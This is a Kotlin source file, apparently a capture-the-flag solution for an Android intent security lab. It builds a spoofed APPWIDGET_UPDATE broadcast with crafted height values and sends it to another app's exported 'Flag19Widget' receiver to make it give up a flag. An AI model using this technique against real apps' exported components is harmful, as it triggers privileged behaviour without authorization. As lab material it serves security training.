package com.pachinko.intentattacksurface.utils

import android.appwidget.AppWidgetManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle

object Flag19 {
    fun getFlag(context: Context) {
        val bundle = Bundle().apply {
            putInt("appWidgetMaxHeight", 1094795585)
            putInt("appWidgetMinHeight", 322376503)
        }
        val intent = Intent().apply {
            action = "com.pachinko.APPWIDGET_UPDATE"
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.receivers.Flag19Widget"
            )
            putExtra("appWidgetOptions", bundle)
        }
        context.sendBroadcast(intent)
    }
}
